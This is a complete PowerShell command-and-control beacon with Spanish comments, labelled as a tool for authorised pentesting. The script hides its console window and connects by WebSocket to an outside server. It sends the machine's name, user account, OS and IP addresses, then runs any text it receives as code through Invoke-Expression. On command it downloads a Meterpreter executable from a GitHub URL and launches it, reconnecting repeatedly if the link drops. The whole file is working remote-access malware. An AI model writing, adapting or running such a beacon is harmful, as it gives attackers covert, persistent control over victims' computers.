# Beacon C2 para pentesting autorizado (Windows, solo .NET, sin dependencias).
# Ejecutar:  powershell -ExecutionPolicy Bypass -File beacon.ps1
# Oculta la consola y envia info detallada del equipo al C2 al conectarse.

# --- Ocultar la ventana de consola (Win32) ---
try {
    Add-Type -Namespace Win32 -Name Native -MemberDefinition @'
[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@ -ErrorAction Stop
    [Win32.Native]::ShowWindow([Win32.Native]::GetConsoleWindow(), 0) | Out-Null
} catch {}

$C2_URL          = "wss://c2-render.onrender.com"
$METERPRETER_URL = "https://github.com/R0b0tik0/shell/raw/refs/heads/main/meterpreter.exe"
$PAYLOAD_PATH    = "$env:windir\temp\Cache\meterpreter.exe"
$LOG_PATH        = "$env:windir\temp\Cache\beacon.log"
$RETRY_SECONDS   = 15

# --- Log a consola (si es visible) y a archivo ---
function Write-Log([string]$msg) {
    $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $msg"
    try { Add-Content -Path $LOG_PATH -Value $line -Encoding UTF8 } catch {}
    Write-Host $line
}

# --- Info detallada del equipo ---
function Get-BeaconInfo {
    $os = "desconocido"; $arch = "desconocido"
    try { $os = [System.Environment]::OSVersion.VersionString } catch {}
    try { $arch = [System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture.ToString() } catch {}
    $ips = @()
    try {
        $ips = @(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction Stop |
            Where-Object { $_.IPAddress -notlike '169.254.*' -and $_.IPAddress -ne '127.0.0.1' } |
            Select-Object -ExpandProperty IPAddress)
    } catch {
        try { $ips = @([System.Net.Dns]::GetHostAddresses($env:COMPUTERNAME) | ForEach-Object { $_.IPAddressToString }) } catch {}
    }
    if (-not $ips) { $ips = @("sin IP") }
    return "equipo=$env:COMPUTERNAME | usuario=$env:USERDOMAIN\$env:USERNAME | os=$os ($arch) | ip=$($ips -join ',')"
}

$attempt = 0
while ($true) {
    $attempt++
    $ws = $null
    try {
        $ws  = [System.Net.WebSockets.ClientWebSocket]::new()
        $cts = [System.Threading.CancellationToken]::None

        Write-Log "intento $attempt -> conectando a $C2_URL"
        $null = $ws.ConnectAsync([Uri]$C2_URL, $cts).GetAwaiter().GetResult()

        # Primer mensaje: info del equipo (la veras en los logs del C2).
        $info = Get-BeaconInfo
        Write-Log "conectado: $info"
        $first = [System.Text.Encoding]::UTF8.GetBytes($info)
        $null = $ws.SendAsync([ArraySegment[byte]]::new($first),
            [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $cts).GetAwaiter().GetResult()

        while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
            # Leer un mensaje completo (puede venir en varios fragmentos).
            $buffer = [byte[]]::new(8192)
            $ms = [System.IO.MemoryStream]::new()
            do {
                $result = $ws.ReceiveAsync([ArraySegment[byte]]::new($buffer), $cts).GetAwaiter().GetResult()
                $ms.Write($buffer, 0, $result.Count)
            } while (-not $result.EndOfMessage)

            $text = [System.Text.Encoding]::UTF8.GetString($ms.ToArray())
            Write-Log "recibido: $text"

            if ($text -like "conectar:*") {
                # Comando: conectar:host:puerto -> descarga el payload y lo lanza.
                $target = ($text -split "conectar:", 2)[1].Trim()
                Write-Log "descargando payload hacia $target ..."
                try {
                    New-Item -ItemType Directory -Force -Path (Split-Path $PAYLOAD_PATH) | Out-Null
                    Invoke-WebRequest -Uri $METERPRETER_URL -OutFile $PAYLOAD_PATH -UseBasicParsing
                    Start-Process -FilePath $PAYLOAD_PATH -ArgumentList $target
                    Write-Log "payload lanzado"
                } catch {
                    Write-Log "error descargando/ejecutando payload: $_"
                }
            } else {
                # Cualquier otro texto: ejecucion directa (solo pruebas).
                try {
                    Invoke-Expression $text
                } catch {
                    Write-Log "error ejecutando: $_"
                }
            }
        }
    } catch {
        Write-Log "error de conexion: $_"
    } finally {
        if ($ws) { $ws.Dispose() }
    }
    Write-Log "reintentando en $RETRY_SECONDS s ..."
    Start-Sleep -Seconds $RETRY_SECONDS
}
